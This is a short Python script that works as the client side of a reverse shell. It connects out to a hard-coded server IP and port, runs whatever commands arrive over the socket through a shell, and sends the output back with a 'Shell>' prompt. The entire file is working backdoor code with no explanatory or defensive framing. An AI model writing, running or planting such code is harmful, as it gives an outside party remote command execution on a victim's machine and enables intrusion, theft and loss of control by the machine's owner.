import socket
import subprocess
import os
import sys

SERVER_HOST = "192.168.1.133"   # Server IP
SERVER_PORT = 5003 # Server Port
BUFFER_SIZE = 10240 # Buffer Size


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE)
    if command[:2].decode("utf-8") == 'cd':
        try:
            os.chdir(command[3:].decode("utf-8"))
        except:
            continue
    if len(command) > 0:
        try:
            cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8", "ignore")     
            s.send(str.encode(output_str + 'Shell> ' +  str(os.getcwd())))
        except:
            continue
